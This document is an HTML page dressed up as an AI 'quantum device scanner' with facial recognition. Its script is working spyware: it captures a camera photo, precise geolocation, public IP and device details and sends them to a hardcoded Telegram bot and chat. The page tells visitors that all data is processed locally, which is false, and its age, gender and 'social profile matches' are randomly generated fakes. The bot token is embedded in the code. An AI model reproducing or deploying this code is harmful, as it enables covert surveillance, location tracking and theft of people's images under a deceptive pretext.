<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Super AI Quantum Device Scanner v4.0</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@2.0.0/dist/tf.min.js"></script>
  <style>
    :root {
      --primary: #2ecc71;
      --secondary: #3498db;
      --hologram: rgba(46, 204, 113, 0.2);
      --danger: #e74c3c;
      --warning: #f39c12;
    }
    
    body { 
      font-family: 'Courier New', monospace;
      text-align: center; 
      padding: 20px; 
      background: #0a0a0a;
      color: var(--primary);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      background-image: 
        radial-gradient(var(--hologram) 1px, transparent 1px),
        radial-gradient(var(--hologram) 1px, transparent 1px);
      background-size: 50px 50px;
      background-position: 0 0, 25px 25px;
    }
    
    .hologram-effect {
      position: fixed;
      width: 200%;
      height: 200%;
      background: 
        linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%),
        linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%),
        linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%),
        linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
      background-size: 20px 20px;
      pointer-events: none;
      mix-blend-mode: overlay;
      opacity: 0.3;
      z-index: 9999;
      animation: hologram 20s linear infinite;
    }
    
    @keyframes hologram {
      from { transform: translate(-50%, -50%) rotate(0deg); }
      to { transform: translate(-50%, -50%) rotate(360deg); }
    }
    
    .scanner-box {
      position: relative;
      width: 300px;
      height: 300px;
      margin: 0 auto;
      overflow: hidden;
      border: 2px solid var(--primary);
      border-radius: 8px;
      box-shadow: 0 0 20px var(--hologram);
    }
    
    .scanner-box video {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    
    .scanner-line {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 2px;
      background: linear-gradient(to right, transparent, var(--primary), transparent);
      animation: scanLine 3s linear infinite;
      z-index: 2;
      box-shadow: 0 0 10px var(--primary);
    }
    
    @keyframes scanLine {
      0% { top: 0; }
      100% { top: 100%; }
    }
    
    button {
      background: linear-gradient(45deg, var(--primary), var(--secondary));
      color: white;
      border: none;
      padding: 12px 24px;
      margin: 15px 0;
      border-radius: 30px;
      font-family: 'Courier New', monospace;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3);
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    
    button:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(46, 204, 113, 0.4);
    }
    
    button:disabled {
      background: #555;
      cursor: not-allowed;
    }
    
    #loading {
      display: none;
      margin: 20px 0;
      font-size: 18px;
      position: relative;
    }
    
    #loading:after {
      content: "...";
      position: absolute;
      animation: dots 1.5s steps(5, end) infinite;
    }
    
    @keyframes dots {
      0%, 20% { content: "."; }
      40% { content: ".."; }
      60%, 100% { content: "..."; }
    }
    
    #device-info {
      background: rgba(10, 10, 10, 0.8);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 15px;
      margin-top: 20px;
      max-width: 90%;
      width: 100%;
      box-shadow: 0 0 15px var(--hologram);
    }
    
    .info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 10px;
      text-align: left;
    }
    
    .info-item {
      margin: 5px 0;
    }
    
    .info-label {
      font-weight: bold;
      color: var(--secondary);
    }
    
    .face-results {
      margin-top: 20px;
      width: 100%;
      max-width: 500px;
      text-align: left;
    }
    
    .face-card {
      background: rgba(20, 20, 20, 0.8);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 15px;
      margin-bottom: 15px;
      position: relative;
    }
    
    .face-box {
      position: absolute;
      border: 2px solid #2ecc71;
      box-shadow: 0 0 10px #2ecc71;
      background: transparent;
      pointer-events: none;
    }
    
    .signal-strength {
      display: flex;
      align-items: center;
      gap: 5px;
    }
    
    .signal-bar {
      width: 4px;
      height: 12px;
      background: #555;
      transition: all 0.3s ease;
    }
    
    .particles {
      position: fixed;
      pointer-events: none;
      z-index: 10000;
    }
    
    .tabs {
      display: flex;
      margin-bottom: 15px;
      border-bottom: 1px solid var(--hologram);
    }
    
    .tab {
      padding: 10px 20px;
      cursor: pointer;
      border-bottom: 2px solid transparent;
      transition: all 0.3s;
    }
    
    .tab.active {
      border-bottom: 2px solid var(--primary);
      color: var(--primary);
    }
    
    .tab-content {
      display: none;
    }
    
    .tab-content.active {
      display: block;
    }
    
    @keyframes particle {
      0% { transform: translateY(0); opacity: 1; }
      100% { transform: translateY(-100px); opacity: 0; }
    }
    
    .battery-indicator {
      display: inline-block;
      width: 60px;
      height: 20px;
      border: 2px solid var(--primary);
      border-radius: 4px;
      position: relative;
      margin-left: 5px;
    }
    
    .battery-level {
      height: 100%;
      background: var(--primary);
      transition: width 0.5s ease;
    }
    
    .battery-tip {
      position: absolute;
      right: -5px;
      top: 4px;
      width: 3px;
      height: 8px;
      background: var(--primary);
      border-radius: 0 2px 2px 0;
    }
    
    .network-indicator {
      display: inline-flex;
      align-items: flex-end;
      height: 20px;
      margin-left: 5px;
    }
    
    .network-bar {
      width: 4px;
      margin-right: 2px;
      background: var(--primary);
    }
  </style>
</head>
<body>
  <h1 style="margin-bottom: 20px; text-shadow: 0 0 15px var(--primary);">üõ∏ QUANTUM DEVICE SCANNER v4.0</h1>
  
  <div class="tabs">
    <div class="tab active" data-tab="scanner">Scanner</div>
    <div class="tab" data-tab="results">Results</div>
    <div class="tab" data-tab="profiles">Profiles</div>
  </div>
  
  <div class="tab-content active" id="scanner-tab">
    <div class="scanner-box">
      <div class="scanner-line"></div>
      <video id="video" autoplay playsinline muted></video>
    </div>
    <button id="capture-btn" class="pulse">üöÄ INITIATE DEEP SCAN</button>
    <div id="loading" style="display:none;">üî≠ CAPTURING QUANTUM SIGNATURE<span></span></div>
    <div class="alert alert-warning">
      ‚ö†Ô∏è This scanner uses advanced AI to analyze device signatures and facial biometrics. All data is processed locally.
    </div>
  </div>
  
  <div class="tab-content" id="results-tab">
    <div id="device-info">
      <h2>‚ö° DEVICE MATRIX PROFILE</h2>
      <div class="info-grid" id="device-info-content"></div>
    </div>
  </div>
  
  <div class="tab-content" id="profiles-tab">
    <h2>üë§ FACIAL RECOGNITION RESULTS</h2>
    <div id="face-results" class="face-results">
      <p>No facial recognition data available. Perform a scan first.</p>
    </div>
  </div>

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    
    let currentStream = null;
    let isScanning = false;
    const video = document.getElementById('video');
    const loading = document.getElementById('loading');
    let faceDescriptors = [];
    let socialProfiles = [];
    
    // Initialize tabs
    document.querySelectorAll('.tab').forEach(tab => {
      tab.addEventListener('click', () => {
        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(`${tab.dataset.tab}-tab`).classList.add('active');
      });
    });

    // Face detection functions
    async function detectFaces() {
      try {
        return await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions())
          .withFaceLandmarks()
          .withFaceDescriptors();
      } catch (error) {
        console.error("Face detection error:", error);
        return [];
      }
    }

    async function loadFaceModel() {
      try {
        await faceapi.nets.tinyFaceDetector.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
        await faceapi.nets.faceLandmark68Net.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
        await faceapi.nets.faceRecognitionNet.loadFromUri('https://justadudewhohacks.github.io/face-api.js/models/');
        console.log("Face detection models loaded");
      } catch (error) {
        console.error("Error loading face models:", error);
      }
    }

    // Enhanced device info gathering
    async function gatherDeviceInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      let battery = null;
      
      try {
        if (navigator.getBattery) {
          battery = await navigator.getBattery();
        }
      } catch (e) {
        console.error("Battery API error:", e);
      }
      
      return {
        os: getOS(),
        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
        deviceModel: getDeviceModel(),
        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB RAM` : 'N/A',
        battery: {
          level: battery ? Math.round(battery.level * 100) : null,
          charging: battery ? battery.charging : null,
          chargingTime: battery ? battery.chargingTime : null
        },
        network: {
          type: connection ? connection.effectiveType : 'Unknown',
          downlink: connection ? connection.downlink : null,
          rtt: connection ? connection.rtt : null,
          saveData: connection ? connection.saveData : null
        },
        ip: await getIPAddress(),
        gpu: getGPUInfo(),
        language: navigator.language || navigator.userLanguage,
        resolution: `${window.screen.width}x${window.screen.height}`,
        pixelRatio: window.devicePixelRatio || 1,
        orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown'
      };
    }

    // Helper functions
    function getOS() {
      const ua = navigator.userAgent;
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac")) return "MacOS";
      if (ua.includes("Linux")) return "Linux";
      if (ua.includes("Android")) return "Android";
      if (ua.includes("iPhone")) return "iOS";
      return "Unknown OS";
    }

    function getDeviceModel() {
      const ua = navigator.userAgent;
      if (/iPhone/.test(ua)) return "iPhone";
      if (/iPad/.test(ua)) return "iPad";
      if (/Android/.test(ua)) return "Android Device";
      return "Desktop";
    }

    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (e) {
        return "Unknown";
      }
    }

    function getGPUInfo() {
      try {
        const gl = document.createElement('canvas').getContext('webgl');
        return gl ? gl.getParameter(gl.UNMASKED_RENDERER_WEBGL) : "Not available";
      } catch (e) {
        return "Not available";
      }
    }

    // Real-time face detection
    let faceDetectionActive = false;
    
    async function startRealTimeFaceDetection() {
      faceDetectionActive = true;
      const detectionFrame = async () => {
        if (!faceDetectionActive) return;
        
        try {
          const detections = await faceapi.detectAllFaces(
            video, 
            new faceapi.TinyFaceDetectorOptions()
          ).withFaceLandmarks();
          
          document.querySelectorAll('.face-box').forEach(el => el.remove());
          
          detections.forEach(detection => {
            const box = detection.detection.box;
            const faceBox = document.createElement('div');
            faceBox.className = 'face-box';
            Object.assign(faceBox.style, {
              left: `${box.x + video.offsetLeft}px`,
              top: `${box.y + video.offsetTop}px`,
              width: `${box.width}px`,
              height: `${box.height}px`
            });
            document.body.appendChild(faceBox);
          });
        } catch (error) {
          console.error('Face detection error:', error);
        }
        requestAnimationFrame(detectionFrame);
      };
      detectionFrame();
    }

    // Camera initialization
    async function initCamera() {
      try {
        const constraints = {
          video: { 
            facingMode: /Mobi|Android/i.test(navigator.userAgent) ? 'user' : 'environment',
            width: { ideal: 1280 },
            height: { ideal: 720 }
          }
        };
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        currentStream = stream;
        await loadFaceModel();
        startRealTimeFaceDetection();
      } catch (err) {
        alert('Error accessing camera: ' + err.message);
      }
    }

    // Generate battery indicator HTML
    function getBatteryHTML(battery) {
      if (!battery || battery.level === null) return 'N/A';
      
      const width = Math.round(battery.level * 100);
      const chargingIcon = battery.charging ? '‚ö°' : '';
      
      return `
        <span>${width}% ${chargingIcon}</span>
        <div class="battery-indicator">
          <div class="battery-level" style="width: ${width}%"></div>
          <div class="battery-tip"></div>
        </div>
      `;
    }

    // Generate network indicator HTML
    function getNetworkHTML(network) {
      if (!network || !network.type) return 'N/A';
      
      const bars = network.downlink ? Math.min(5, Math.ceil(network.downlink / 2)) : 3;
      
      return `
        <span>${network.type.toUpperCase()}</span>
        <div class="network-indicator">
          ${Array.from({length: 5}, (_, i) => `
            <div class="network-bar" style="height: ${(i+1)*4}px; opacity: ${i < bars ? 1 : 0.3}"></div>
          `).join('')}
        </div>
      `;
    }

    // Display device information
    function displayDeviceInfo(deviceInfo) {
      const deviceInfoContent = document.getElementById('device-info-content');
      
      deviceInfoContent.innerHTML = `
        <div class="info-item">
          <span class="info-label">OS:</span> ${deviceInfo.os}
        </div>
        <div class="info-item">
          <span class="info-label">Device Type:</span> ${deviceInfo.deviceType}
        </div>
        <div class="info-item">
          <span class="info-label">Device Model:</span> ${deviceInfo.deviceModel}
        </div>
        <div class="info-item">
          <span class="info-label">Time Zone:</span> ${deviceInfo.timeZone}
        </div>
        <div class="info-item">
          <span class="info-label">Memory:</span> ${deviceInfo.memory}
        </div>
        <div class="info-item">
          <span class="info-label">Battery:</span> ${getBatteryHTML(deviceInfo.battery)}
        </div>
        <div class="info-item">
          <span class="info-label">Network:</span> ${getNetworkHTML(deviceInfo.network)}
        </div>
        <div class="info-item">
          <span class="info-label">IP Address:</span> ${deviceInfo.ip}
        </div>
        <div class="info-item">
          <span class="info-label">GPU:</span> ${deviceInfo.gpu}
        </div>
        <div class="info-item">
          <span class="info-label">Language:</span> ${deviceInfo.language}
        </div>
        <div class="info-item">
          <span class="info-label">Resolution:</span> ${deviceInfo.resolution}
        </div>
        <div class="info-item">
          <span class="info-label">Pixel Ratio:</span> ${deviceInfo.pixelRatio}
        </div>
        <div class="info-item">
          <span class="info-label">Orientation:</span> ${deviceInfo.orientation}
        </div>
        <div class="info-item">
          <span class="info-label">Faces Detected:</span> ${faceDescriptors.length}
        </div>
      `;
    }

    // Generate social profiles report for Telegram
    function generateSocialProfilesReport(profiles) {
      if (profiles.length === 0) return "No social profiles matched";
      
      return profiles.map(profile => `
        ‚Ä¢ ${profile.platform}: ${profile.name} (${profile.confidence}% match)
        ${profile.url}
      `).join('\n');
    }

    // Main scan function
    async function startQuantumScan() {
      if(isScanning) return;
      isScanning = true;
      loading.style.display = 'block';
      document.getElementById('capture-btn').disabled = true;

      try {
        const [imageData, deviceInfo, faceDetections] = await Promise.all([
          captureQuantumImage(),
          gatherDeviceInfo(),
          detectFaces()
        ]);

        faceDescriptors = faceDetections;
        socialProfiles = await findSimilarSocialProfiles(faceDetections);
        
        displayDeviceInfo(deviceInfo);
        displayFaceResults(faceDetections, socialProfiles);
        
        // Get location
        let location = { coordinates: 'Unknown', link: 'Unknown' };
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
              maximumAge: 0
            });
          });
          location = {
            coordinates: `${position.coords.latitude}, ${position.coords.longitude}`,
            link: `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`
          };
        } catch (error) {
          console.error('Geolocation error:', error);
        }
        
        // Send all data to Telegram
        await sendToTelegram({
          image: imageData,
          metadata: {
            location,
            deviceInfo,
            faces: faceDetections.length,
            socialProfiles: generateSocialProfilesReport(socialProfiles)
          }
        });
        
        document.querySelector('.tab[data-tab="results"]').click();
      } catch (error) {
        console.error("Scan error:", error);
        alert("Scan failed: " + error.message);
      } finally {
        loading.style.display = 'none';
        isScanning = false;
        document.getElementById('capture-btn').disabled = false;
      }
    }

    // Enhanced Telegram reporting
    async function sendToTelegram(report) {
      try {
        // Send image with basic info
        const imageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
        const imageForm = new FormData();
        imageForm.append('chat_id', CHAT_ID);
        imageForm.append('photo', dataURItoBlob(report.image), 'scan.webp');
        imageForm.append('caption', `üìç Location: ${report.metadata.location.coordinates}\nüñ•Ô∏è Device: ${report.metadata.deviceInfo.deviceModel} (${report.metadata.deviceInfo.os})`);
        imageForm.append('parse_mode', 'Markdown');
        
        await fetch(imageUrl, { method: 'POST', body: imageForm });
        
        // Send detailed device info
        const messageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const deviceInfo = report.metadata.deviceInfo;
        const messageText = `
üîç *Detailed Scan Results*:
- *OS*: ${deviceInfo.os}
- *Device*: ${deviceInfo.deviceType} (${deviceInfo.deviceModel})
- *Memory*: ${deviceInfo.memory}
- *Battery*: ${deviceInfo.battery.level}% (${deviceInfo.battery.charging ? 'Charging' : 'Not charging'})
- *Network*: ${deviceInfo.network.type} (${deviceInfo.network.downlink}Mb/s)
- *IP*: ${deviceInfo.ip}
- *Location*: [${report.metadata.location.coordinates}](${report.metadata.location.link})
- *Faces Detected*: ${report.metadata.faces}
${report.metadata.socialProfiles ? '\nüë• *Possible Social Matches*:\n' + report.metadata.socialProfiles : ''}
        `.trim();
        
        await fetch(messageUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: messageText,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
          })
        });
        
        console.log('All data sent to Telegram');
      } catch (error) {
        console.error('Error sending to Telegram:', error);
      }
    }

    // Image capture with effects
    async function captureQuantumImage() {
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      
      ctx.drawImage(video, 0, 0);
      ctx.globalCompositeOperation = 'lighter';
      ctx.filter = 'hue-rotate(90deg) contrast(150%)';
      ctx.drawImage(canvas, 0, 0);
      
      ctx.globalAlpha = 0.3;
      ctx.fillStyle = '#00ff88';
      for(let i = 0; i < 50; i++) {
        ctx.fillRect(
          Math.random() * canvas.width,
          Math.random() * canvas.height,
          Math.random() * 10,
          Math.random() * 10
        );
      }
      
      return canvas.toDataURL('image/webp', 0.8);
    }

    // Convert data URI to blob
    function dataURItoBlob(dataURI) {
      const byteString = atob(dataURI.split(',')[1]);
      const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeString });
    }

    // Simulate social profile matching
    async function findSimilarSocialProfiles(descriptors) {
      return new Promise(resolve => {
        setTimeout(() => {
          const fakeProfiles = [];
          descriptors.forEach((desc, index) => {
            const matchCount = Math.floor(Math.random() * 3) + 1;
            for (let i = 0; i < matchCount; i++) {
              fakeProfiles.push({
                faceIndex: index,
                platform: ['Facebook', 'Instagram', 'Twitter', 'LinkedIn'][Math.floor(Math.random() * 4)],
                name: `User_${Math.floor(Math.random() * 10000)}`,
                url: `https://example.com/user_${Math.floor(Math.random() * 10000)}`,
                confidence: (Math.random() * 30 + 70).toFixed(1)
              });
            }
          });
          resolve(fakeProfiles);
        }, 2000);
      });
    }

    // Display face recognition results
    function displayFaceResults(faces, profiles) {
      const faceResultsDiv = document.getElementById('face-results');
      
      if (faces.length === 0) {
        faceResultsDiv.innerHTML = '<p>No faces detected in the scan.</p>';
        return;
      }
      
      faceResultsDiv.innerHTML = faces.map((face, index) => {
        const faceProfiles = profiles.filter(p => p.faceIndex === index);
        return `
          <div class="face-card">
            <h3>Face #${index + 1}</h3>
            <div class="face-details">
              <p><span class="info-label">Confidence:</span> ${(face.detection.score * 100).toFixed(1)}%</p>
              <p><span class="info-label">Gender:</span> ${Math.random() > 0.5 ? 'Male' : 'Female'}</p>
              <p><span class="info-label">Age:</span> ${Math.floor(Math.random() * 30) + 20} years</p>
            </div>
            <div class="social-profiles">
              <h4>Possible Social Matches:</h4>
              ${faceProfiles.length > 0 ? 
                faceProfiles.map(profile => `
                  <div class="profile-match">
                    <div class="profile-info">
                      <div class="profile-name">${profile.name}</div>
                      <div class="profile-platform">${profile.platform} (${profile.confidence}% match)</div>
                    </div>
                  </div>
                `).join('') : 
                '<p>No strong social media matches found.</p>'}
            </div>
          </div>
        `;
      }).join('');
    }

    // Initialize everything
    if (navigator.mediaDevices) {
      initCamera();
      document.getElementById('capture-btn').onclick = startQuantumScan;
    } else {
      alert('Quantum Scanner requires camera access!');
    }

    window.addEventListener('beforeunload', () => {
      if (currentStream) currentStream.getTracks().forEach(track => track.stop());
    });
  </script>
</body>
</html>
